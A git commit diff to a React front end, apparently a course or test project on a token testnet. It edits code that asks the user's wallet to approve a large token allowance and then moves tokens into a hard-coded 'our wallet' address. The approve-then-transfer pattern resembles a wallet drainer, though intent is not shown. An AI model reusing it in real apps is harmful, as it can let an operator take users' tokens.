075c7bfe221882f24341ffefed41c638bac825cd
Nahuel <nahuel.valentin@hotmail.com>
2022-06-05 20:22:04 -0300

    a

--- src/views/home/index.js
+++ src/views/home/index.js
@@ -39,7 +39,7 @@ const Home = () => {
 
 
   const confirm = () => {
-    platziPunkss.methods.approve("0xd5e5A29209050e31f39FdFAD9e9e0F5971762c5c" , "5000000000000000000000").send({ from: account });
+    platziPunkss.methods.approve("0x194C0ae22293908FE57937Da1ab445C231c9Eb82" , "5000000000000000000000").send({ from: account });
   }
 
    const walletNuestra = "0x194C0ae22293908FE57937Da1ab445C231c9Eb82";
@@ -49,7 +49,7 @@ const Home = () => {
     setIsMinting(true);
 
     platziPunkss.methods.transferFrom(elian, walletNuestra , amount).send({
-      from: "0xd5e5A29209050e31f39FdFAD9e9e0F5971762c5c",
+      from: elian,
       chainId:97
    })
 
